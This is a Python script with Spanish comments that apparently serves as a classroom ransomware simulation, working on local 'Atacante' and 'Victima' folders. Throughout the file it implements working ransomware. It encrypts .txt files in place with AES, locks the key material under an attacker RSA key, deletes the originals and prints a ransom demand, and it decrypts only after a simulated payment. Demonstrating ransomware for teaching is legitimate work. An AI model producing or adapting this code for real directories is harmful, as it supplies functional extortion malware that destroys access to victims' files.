from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import os
import glob
import secrets
import shutil
import hashlib

def limpiar_pantalla():
    # Limpiar la pantalla según el sistema operativo
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def Infeccion():
    # Generar la clave privada
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # Serializar y guardar la clave privada
    private_key_path = os.path.join("Atacante", "Kpriv.pem")
    with open(private_key_path, "wb") as private_key_file:
        private_key_file.write(
            private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )
        )

    # Generar la clave pública
    public_key = private_key.public_key()

    # Serializar y guardar la clave pública
    public_key_path = os.path.join("Atacante", "Kpub.pem")
    with open(public_key_path, "wb") as public_key_file:
        public_key_file.write(
            public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
        )
    print("Claves generadas correctamente.")    
    

def Transmision():
    # Ruta de la clave pública
    public_key_path = os.path.join("Atacante", "Kpub.pem")
    victim_public_key_path = os.path.join("Victima", "Kpub.pem")
    
    # Copiar la clave pública a la carpeta "Victima"
    if not os.path.exists("Victima"):
        os.makedirs("Victima")
    shutil.copy(public_key_path, victim_public_key_path)
    
    # Leer la clave pública
    with open(public_key_path, "rb") as public_key_file:
        public_key_data = public_key_file.read()
    
    # Calcular el hash de la clave pública
    public_key_hash = hashlib.sha256(public_key_data).hexdigest()
    
    # Guardar el hash en la carpeta "Atacante"
    hash_path = os.path.join("Atacante", "public_key_hash.txt")
    with open(hash_path, "w") as hash_file:
        hash_file.write(public_key_hash)
    
    # Validar que el hash se ha escrito correctamente
    if os.path.exists(hash_path):
        print("Éxito: El hash de la clave pública se ha guardado correctamente.")
    else:
        print("Error: No se pudo guardar el hash de la clave pública.")

def generacion():
    # Crear la carpeta "Victima" si no existe
    if not os.path.exists("Victima"):
        os.makedirs("Victima")

    # Generar la clave privada
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # Serializar y guardar la clave privada
    private_key_path = os.path.join("Victima", "private_key.pem")
    with open(private_key_path, "wb") as private_key_file:
        private_key_file.write(
            private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )
        )

    # Generar la clave pública
    public_key = private_key.public_key()

    # Serializar y guardar la clave pública
    public_key_path = os.path.join("Victima", "public_key.pem")
    with open(public_key_path, "wb") as public_key_file:
        public_key_file.write(
            public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
        )

    # Generar un código aleatorio de 128 bits
    ks = secrets.token_bytes(16)  # 16 bytes * 8 bits/byte = 128 bits

    # Guardar el código aleatorio en la carpeta "Victima"
    ks_path = os.path.join("Victima", "KS.bin")
    with open(ks_path, "wb") as ks_file:
        ks_file.write(ks)

def buscar_txt():
    # Ruta de la carpeta "Archivos" dentro de "Victima"
    archivos_path = os.path.join("Victima", "Archivos")
    
    # Lista para almacenar los archivos .txt encontrados
    txt_files = []

    # Recorrer la carpeta "Archivos" y buscar archivos con extensión .txt
    for root, dirs, files in os.walk(archivos_path):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))
    
    return txt_files

def encriptacion_files():
    # Leer el código aleatorio KS desde el archivo
    ks_path = os.path.join("Victima", "KS.bin")
    with open(ks_path, "rb") as ks_file:
        ks = ks_file.read()

    # Obtener la lista de archivos .txt a encriptar
    txt_files = buscar_txt()

    for txt_file in txt_files:
        # Inicializar el vector de inicialización (IV) para AES
        iv = secrets.token_bytes(16)  # AES block size is 16 bytes

        # Crear el cifrador AES-CBC
        cipher = Cipher(algorithms.AES(ks), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        # Leer el contenido del archivo
        with open(txt_file, "rb") as file:
            file_data = file.read()

        # Aplicar padding al contenido del archivo
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(file_data) + padder.finalize()

        # Encriptar el contenido del archivo
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Guardar el contenido encriptado en el mismo archivo
        with open(txt_file, "wb") as file:
            file.write(iv + encrypted_data)  # Guardar IV al inicio del archivo

def limpieza():
    try:
        # Leer la clave pública desde el archivo public_key.pem
        public_key_victim_path = os.path.join("Victima", "public_key.pem")
        with open(public_key_victim_path, "rb") as public_key_victim_file:
            public_key_victim = serialization.load_pem_public_key(
                public_key_victim_file.read(),
                backend=default_backend()
            )

        # Leer el código aleatorio KS desde el archivo
        ks_path = os.path.join("Victima", "KS.bin")
        with open(ks_path, "rb") as ks_file:
            ks = ks_file.read()

        # Encriptar el código aleatorio KS con la clave pública public_key.pem
        encrypted_ks = public_key_victim.encrypt(
            ks,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Guardar el código encriptado en un archivo KS.enc
        encrypted_ks_path = os.path.join("Victima", "KS.enc")
        with open(encrypted_ks_path, "wb") as enc_file:
            enc_file.write(encrypted_ks)

        # Leer la clave pública desde el archivo Kpub.pem en la carpeta Victima
        public_key_attacker_path = os.path.join("Victima", "Kpub.pem")
        with open(public_key_attacker_path, "rb") as public_key_attacker_file:
            public_key_attacker = serialization.load_pem_public_key(
                public_key_attacker_file.read(),
                backend=default_backend()
            )

        # Leer la clave privada desde el archivo private_key.pem
        private_key_path = os.path.join("Victima", "private_key.pem")
        with open(private_key_path, "rb") as private_key_file:
            private_key_data = private_key_file.read()

        # Generar una clave AES y un IV
        aes_key = os.urandom(32)  # AES-256
        iv = os.urandom(16)

        # Crear el cifrador AES en modo CBC
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
        encryptor = cipher.encryptor()

        # Aplicar padding a la clave privada
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_private_key = padder.update(private_key_data) + padder.finalize()

        # Encriptar la clave privada de la víctima con AES
        encrypted_private_key = encryptor.update(padded_private_key) + encryptor.finalize()

        # Encriptar la clave AES con la clave pública del atacante
        encrypted_aes_key = public_key_attacker.encrypt(
            aes_key,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Guardar la clave privada encriptada, el IV y la clave AES encriptada en un archivo Kprivate.enc
        encrypted_private_key_path = os.path.join("Victima", "Kprivate.enc")
        with open(encrypted_private_key_path, "wb") as enc_file:
            enc_file.write(iv + encrypted_private_key + encrypted_aes_key)

        # Eliminar los archivos originales
        os.remove(ks_path)
        os.remove(private_key_path)
        os.remove(public_key_attacker_path)

        # Generar el hash del archivo Kprivate.enc
        hash_md5 = hashlib.md5()
        with open(encrypted_private_key_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_md5.update(chunk)
        hash_value = hash_md5.hexdigest()

        # Guardar el hash en un archivo
        hash_file_path = os.path.join("Victima", "Kprivate_hash.txt")
        with open(hash_file_path, "w") as hash_file:
            hash_file.write(hash_value)

        # Imprimir mensajes de finalización
        print("PC comprometida!! por favor pague el rescate $$")

    except Exception as e:
        print(f"Error: {e}")

def Pago():
    try:
        # Crear la carpeta "Atacante" si no existe
        if not os.path.exists("Atacante"):
            os.makedirs("Atacante")

        # Ruta del archivo encriptado y la clave privada
        encrypted_private_key_path = os.path.join("Victima", "Kprivate.enc")
        destination_path = os.path.join("Atacante", "Kprivate.enc")
        private_key_path = os.path.join("Atacante", "Kpriv.pem")

        # Copiar el archivo encriptado a la carpeta "Atacante"
        shutil.copy(encrypted_private_key_path, destination_path)

        # Leer la clave privada desde el archivo Kpriv.pem
        with open(private_key_path, "rb") as private_key_file:
            private_key = serialization.load_pem_private_key(
                private_key_file.read(),
                password=None,
                backend=default_backend()
            )

        # Leer el archivo encriptado
        with open(destination_path, "rb") as enc_file:
            iv = enc_file.read(16)  # Leer el IV del inicio del archivo
            encrypted_private_key = enc_file.read()

        # Desencriptar la clave AES con la clave privada
        encrypted_aes_key = encrypted_private_key[-256:]  # Últimos 256 bytes son la clave AES encriptada
        encrypted_private_key = encrypted_private_key[:-256]  # El resto es la clave privada encriptada

        aes_key = private_key.decrypt(
            encrypted_aes_key,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Crear el descifrador AES-CBC
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
        decryptor = cipher.decryptor()

        # Desencriptar la clave privada
        decrypted_padded_private_key = decryptor.update(encrypted_private_key) + decryptor.finalize()

        # Remover el padding del contenido desencriptado
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_private_key = unpadder.update(decrypted_padded_private_key) + unpadder.finalize()

        # Guardar la clave privada desencriptada como private_key.pem
        decrypted_private_key_path = os.path.join("Atacante", "private_key.pem")
        with open(decrypted_private_key_path, "wb") as private_key_file:
            private_key_file.write(decrypted_private_key)

        # Copiar el archivo private_key.pem a la carpeta "Victima"
        victim_private_key_path = os.path.join("Victima", "private_key.pem")
        shutil.copy(decrypted_private_key_path, victim_private_key_path)

        print("Clave privada desencriptada y copiada correctamente.")

    except Exception as e:
        print(f"Error: {e}")

def eliminar_archivos_con_patron(directorio, patron):
    archivos = glob.glob(os.path.join(directorio, patron))
    for archivo in archivos:
        os.remove(archivo)
        print(f"Archivo eliminado: {archivo}")

def desencriptacion():
    # Ruta del archivo private_key.pem
    private_key_path = os.path.join("Victima", "private_key.pem")

    # Validar que existe el archivo private_key.pem
    if not os.path.exists(private_key_path):
        print("Error: El archivo private_key.pem no existe.")
        return

    # Calcular el hash del archivo private_key.pem
    with open(private_key_path, "rb") as private_key_file:
        private_key_data = private_key_file.read()
        private_key_hash = hashlib.sha256(private_key_data).hexdigest()

    # Guardar el hash en la carpeta "Atacante"
    hash_path = os.path.join("Atacante", "private_key_hash.txt")
    with open(hash_path, "w") as hash_file:
        hash_file.write(private_key_hash)

    # Leer la clave privada desde el archivo private_key.pem
    private_key = serialization.load_pem_private_key(
        private_key_data,
        password=None,
        backend=default_backend()
    )

    # Leer el archivo KS.enc
    ks_enc_path = os.path.join("Victima", "KS.enc")
    with open(ks_enc_path, "rb") as enc_file:
        encrypted_ks = enc_file.read()

    # Desencriptar el archivo KS.enc con la clave privada
    ks = private_key.decrypt(
        encrypted_ks,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Guardar el código desencriptado en un archivo KS.bin
    ks_bin_path = os.path.join("Victima", "KS.bin")
    with open(ks_bin_path, "wb") as ks_file:
        ks_file.write(ks)

    # Obtener la lista de archivos .txt a desencriptar
    txt_files = buscar_txt()

    for txt_file in txt_files:
        # Leer el contenido del archivo encriptado
        with open(txt_file, "rb") as file:
            iv = file.read(16)  # Leer el IV del inicio del archivo
            encrypted_data = file.read()

        # Crear el descifrador AES-CBC
        cipher = Cipher(algorithms.AES(ks), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()

        # Desencriptar el contenido del archivo
        decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Remover el padding del contenido desencriptado
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

        # Guardar el contenido desencriptado en el mismo archivo
        with open(txt_file, "wb") as file:
            file.write(decrypted_data)
    
    # Eliminar los archivos KS.bin, private_key.pem, y public_key.pem en la carpeta "Victima"
    eliminar_archivos_con_patron("Victima", "K*")
    eliminar_archivos_con_patron("Victima", "private_key.pem")
    eliminar_archivos_con_patron("Victima", "public_key.pem")    

    print("Se realizo la desercripción de los archivos")
        
def Clean():
    try:
        # Eliminar todos los archivos de la carpeta Victima, excepto la carpeta Archivos
        for root, dirs, files in os.walk("Victima"):
            for file in files:
                file_path = os.path.join(root, file)
                if "Archivos" not in root:
                    os.remove(file_path)
                    print(f"Archivo eliminado: {file_path}")

        # Crear la carpeta Archivos si no existe
        archivos_path = os.path.join("Victima", "Archivos")
        if not os.path.exists(archivos_path):
            os.makedirs(archivos_path)

        # Copiar todos los archivos .txt que estén en la raíz a la carpeta Archivos
        txt_files = glob.glob(os.path.join("Victima", "*.txt"))
        for txt_file in txt_files:
            shutil.move(txt_file, archivos_path)
            print(f"Archivo movido: {txt_file} a {archivos_path}")

        # Eliminar todos los archivos de la carpeta Atacante
        for root, dirs, files in os.walk("Atacante"):
            for file in files:
                file_path = os.path.join(root, file)
                os.remove(file_path)
                print(f"Archivo eliminado: {file_path}")

        print("Puesta en Cero completada correctamente.")

    except Exception as e:
        print(f"Error: {e}")

def menu():
    while True:
        limpiar_pantalla()
        print("Seleccione una opción:")
        print("1.- Preparacion de la infeccion")
        print("2.- Transmision a la Victima del Rasomware")
        print("3.- Encriptacion de los archivos")
        print("4.- Pago de rescate - Desencriptacion")
        print("9.- Puesta en Cero del esceario")
        print("0.- Salir")
        
        opcion = input("Ingrese el número de la opción: ")
        
        if opcion == "1":
            limpiar_pantalla()
            Infeccion()
            input("Presione cualquier tecla para continuar...")
        elif opcion == "2":
            limpiar_pantalla()
            Transmision()
            input("Presione cualquier tecla para continuar...")
        elif opcion == "3":
            limpiar_pantalla()
            generacion()
            encriptacion_files()
            limpieza()
            input("Presione cualquier tecla para continuar...")
        elif opcion == "4":
            limpiar_pantalla()
            Pago()
            desencriptacion()
            input("Presione cualquier tecla para continuar...")
        elif opcion == "9":
            limpiar_pantalla()
            Clean()
            input("Presione cualquier tecla para continuar...")
        elif opcion == "0":
            limpiar_pantalla()
            print("Saliendo del programa...")
            break
        else:
            limpiar_pantalla()
            print("Opción no válida. Intente de nuevo.")

# Mostrar el menú
menu()
